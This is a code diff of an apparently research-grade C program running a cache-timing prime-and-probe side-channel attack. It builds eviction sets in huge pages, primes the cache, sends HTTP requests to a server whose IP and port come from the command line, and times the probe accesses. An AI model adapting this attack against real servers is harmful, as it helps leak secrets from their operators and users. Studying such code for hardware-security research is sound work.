@@ -8,18 +8,11 @@
 #include "ctattack.h"
 
 
-/*
-#include <linux/module.h>      
-#include <linux/kernel.h>      
-#include <linux/init.h>         
-#include <linux/hardirq.h>
-#include <linux/preempt.h>
-#include <linux/sched.h>
-*/
-
 
 #define RAM_ACCESS_TIME_EMPIRICAL 299
 #define CACHE_LINE_DISTANCES 16
+#define CACHE_LINE_CHECK_OFFSET 63
+#define CACHE_LINE_VICTIM_OFFSET 256
 
 int main(int argc, char* argv[])
 {
@@ -29,12 +22,12 @@ int main(int argc, char* argv[])
     unsigned long int begin2, end2;
     unsigned long int x = 0;
 
-    volatile char *tmp1;
-    volatile char **tmp2;
-    volatile char **tmp3;
+    volatile char **tmp1;
+//    volatile char **tmp2;
+//    volatile char **tmp3;
     
-    char ch = '\0';
-    FILE *fp;
+//    char ch = '\0';
+//    FILE *fp;
 
     size_t mem_length = (size_t)MB(2); 
     int mem_length_char = ((int)mem_length/sizeof(char));
@@ -46,52 +39,93 @@ int main(int argc, char* argv[])
     volatile char *D = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
 
 
-    // brings some data in Exclusive (OR Shared state - provably exclusive)
+    // brings some data in Exclusive state (OR Shared state - probably exclusive)
     x = B[MB(0)];
-    //x = B[MB(2)];
-    //x = B[MB(4)];
     x = C[MB(0)];
-    //x = C[MB(2)];
-    //x = D[MB(0)];
     x = D[MB(0)];
-    //x = B[MB(4)/8+3*CACHE_L3_SET_OFFSET/8];
-
-
-
-
 
     // This is used to render the stride prefetcher useless... hopefully
-    volatile char *B_arr[24];
-    B_arr[0]  = B + (0x00 << 17);
-    B_arr[1]  = B + (0x03 << 17);
-    B_arr[2]  = B + (0x04 << 17);
-    B_arr[3]  = B + (0x07 << 17);
-    B_arr[4]  = B + (0x09 << 17);
-    B_arr[5]  = B + (0x0A << 17);
-    B_arr[6]  = B + (0x0D << 17);
-    B_arr[7]  = B + (0x0E << 17);
 
-    B_arr[8]  = C + (0x00 << 17);
-    B_arr[9]  = C + (0x03 << 17);
-    B_arr[10] = C + (0x04 << 17);
-    B_arr[11] = C + (0x07 << 17);
-    B_arr[12] = C + (0x09 << 17);
-    B_arr[13] = C + (0x0A << 17);
-    B_arr[14] = C + (0x0D << 17);
-    B_arr[15] = C + (0x0E << 17);
+    // This is used to index into the same cache slice.
+    volatile char *B_arr[24];
+   
+    B_arr[0]  = B + (0x00 << 18);
+    B_arr[1]  = B + (0x01 << 18);
+    B_arr[2]  = B + (0x02 << 18);
+    B_arr[3]  = B + (0x03 << 18);
+    B_arr[4]  = B + (0x04 << 18);
+    B_arr[5]  = B + (0x05 << 18);
+    B_arr[6]  = B + (0x06 << 18);
+    B_arr[7]  = B + (0x07 << 18);
+
+    B_arr[8]  = C + (0x00 << 18);
+    B_arr[9]  = C + (0x01 << 18);
+    B_arr[10] = C + (0x02 << 18);
+    B_arr[11] = C + (0x03 << 18);
+    B_arr[12] = C + (0x04 << 18);
+    B_arr[13] = C + (0x05 << 18);
+    B_arr[14] = C + (0x06 << 18);
+    B_arr[15] = C + (0x07 << 18);
+    
+    for (int i = 0; i < 16; ++i) {
+        printPtr2bin((void *)B_arr[i]);
+    }
+    
+    printf("\n");
 /*
-    B_arr[8]  = B + (0x10 << 17);
-    B_arr[9]  = B + (0x13 << 17);
-    B_arr[10] = B + (0x14 << 17);
-    B_arr[11]  = B + (0x17 << 17);
-    B_arr[12]  = B + (0x19 << 17);
-    B_arr[13]  = B + (0x1A << 17);
-    B_arr[14]  = B + (0x1D << 17);
-    B_arr[15]  = B + (0x1E << 17);
+    B[0]              = (volatile char *)(B + (0x01 << 18)/8);
+    B[(0x01 << 18)/8] = (volatile char *)(B + (0x02 << 18)/8);
+    B[(0x02 << 18)/8] = (volatile char *)(B + (0x03 << 18)/8);
+    B[(0x03 << 18)/8] = (volatile char *)(B + (0x04 << 18)/8);
+    B[(0x04 << 18)/8] = (volatile char *)(B + (0x05 << 18)/8);
+    B[(0x05 << 18)/8] = (volatile char *)(B + (0x06 << 18)/8);
+    B[(0x06 << 18)/8] = (volatile char *)(B + (0x07 << 18)/8);
+    B[(0x07 << 18)/8] = (volatile char *)(C);
+
+    C[0]              = (volatile char *)(C + (0x01 << 18)/8);
+    C[(0x01 << 18)/8] = (volatile char *)(C + (0x02 << 18)/8);
+    C[(0x02 << 18)/8] = (volatile char *)(C + (0x03 << 18)/8);
+    C[(0x03 << 18)/8] = (volatile char *)(C + (0x04 << 18)/8);
+    C[(0x04 << 18)/8] = (volatile char *)(C + (0x05 << 18)/8);
+    C[(0x05 << 18)/8] = (volatile char *)(C + (0x06 << 18)/8);
+    C[(0x06 << 18)/8] = (volatile char *)(C + (0x07 << 18)/8);
+    C[(0x07 << 18)/8] = (volatile char *)(B);
 */
 
+int count = 0;
+
+tt2 = 100001;
+while (tt2 > 3000) {
+
+    if (argc != 3) {
+        printf("[!]Usage: %s IP PORT\n", argv[0]);
+        return 1;
+    }
+    char *ip_str = argv[1];
+    int server_port = atoi(argv[2]);
+    int socket_desc;
+    struct sockaddr_in server;
+    char *message, server_reply[2000];
+    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
+    if (socket_desc == -1) {
+        printf("Could not create socket\n");
+        //return 1;
+    }
+    //printf("socket_desc: %d\n", socket_desc);
+    server.sin_addr.s_addr = inet_addr(ip_str);     //80.239.174.120
+    server.sin_family = AF_INET;
+    server.sin_port = htons( server_port );
+    //Connect to remote server
+    if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
+    {
+        printf("connection error\n");
+        return 1;
+    }
+    //printf("Connected\n");
 
 
+
+    count++;
 
 
     TIMESTAMP_START;
@@ -99,33 +133,64 @@ int main(int argc, char* argv[])
     TIMESTAMP_START;
     TIMESTAMP_STOP;
 
-
-    for (int i = 0; i < 13; ++i) {
-        tmp1 = B_arr[i];
-        TIMESTAMP_START;
+    // PRIME
+    tmp1 = B;
+    for (int i = 0; i < 16; ++i) {
+        tmp1 = B_arr[i]+CACHE_LINE_CHECK_OFFSET;
         x += *tmp1;
-        //x += B[i];
-        TIMESTAMP_STOP;
-        begin = get_global_timestamp_start();
-        end = get_global_timestamp_stop();
-        TIMESTAMP_START;
-        TIMESTAMP_STOP;
-        begin2 = get_global_timestamp_start();
-        end2 = get_global_timestamp_stop();
-        tt += (end-begin)-(end2-begin2);
-        printf("%p: %lu\n", tmp1, (end-begin)-(end2-begin2) );
-        //printPtr2bin(B_arr[i]);
+    }
+
+    // REPRIME
+    // Second Load to clear L1 and L2 caches
+    for (int i = 0; i < 16; ++i) {
+        tmp1 = B_arr[i]+CACHE_LINE_CHECK_OFFSET+KB(32);
+        x += *tmp1;
+    }
+
+    //printf("\n");
+
+
+    message = "GET / HTTP/1.1\r\n\r\n";
+    if( send(socket_desc , message , strlen(message) , 0) < 0)
+    {
+        puts("Send failed");
+        return 1;
+    }
+    //puts("Data Send\n");
+    if( recv(socket_desc, server_reply , 2000 , 0) < 0)
+    {
+        puts("recv failed");
     }
 
 
 
-    printf("\n");
-
-
-
-    TIMESTAMP_START;
-    //x += *D;
+    // VICTIM RUN
+//    x += *(D+CACHE_LINE_VICTIM_OFFSET);
     //x += *(D + (1 << 17));
+
+
+    // PROBE & MEASURE
+    tmp1 = B;
+    tt2 = 0;
+    //TIMESTAMP_START;
+    for (int i = 0; i < 16; ++i) {
+        tmp1 = B_arr[i]+CACHE_LINE_CHECK_OFFSET;
+        TIMESTAMP_START;
+        x += *tmp1;
+        //x += B[i];
+    
+        TIMESTAMP_STOP;
+        begin = get_global_timestamp_start();
+        end = get_global_timestamp_stop();
+        //TIMESTAMP_START;
+        //TIMESTAMP_STOP;
+        //begin2 = get_global_timestamp_start();
+        //end2 = get_global_timestamp_stop();
+        tt2 += (end-begin);//-(end2-begin2);
+    
+        //printf("%p: %lu\n", tmp1, (end-begin)-(end2-begin2) );
+    }
+/*    
     TIMESTAMP_STOP;
     begin = get_global_timestamp_start();
     end = get_global_timestamp_stop();
@@ -133,30 +198,18 @@ int main(int argc, char* argv[])
     TIMESTAMP_STOP;
     begin2 = get_global_timestamp_start();
     end2 = get_global_timestamp_stop();
-    printf("%p: %lu\n", D, (end-begin)-(end2-begin2) );
+    tt2 = (end-begin);//-(end2-begin2);
+*/
 
 
-    printf("\n");
+    //puts("Reply received\n");
+    //puts(server_reply);
+    close(socket_desc);
+}
 
-
-
-    for (int i = 0; i < 13; ++i) {
-        tmp1 = B_arr[i];
-        TIMESTAMP_START;
-        x += *tmp1;
-        //x += B[i];
-        TIMESTAMP_STOP;
-        begin = get_global_timestamp_start();
-        end = get_global_timestamp_stop();
-        TIMESTAMP_START;
-        TIMESTAMP_STOP;
-        begin2 = get_global_timestamp_start();
-        end2 = get_global_timestamp_stop();
-        tt += (end-begin)-(end2-begin2);
-        printf("%p: %lu\n", tmp1, (end-begin)-(end2-begin2) );
-    }
-
-    
+    printf(" tt: %lu\n", tt);
+    printf("tt2: %lu\n", tt2);
+    printf("count: %d\n", count);
 
     printf("\n");
 
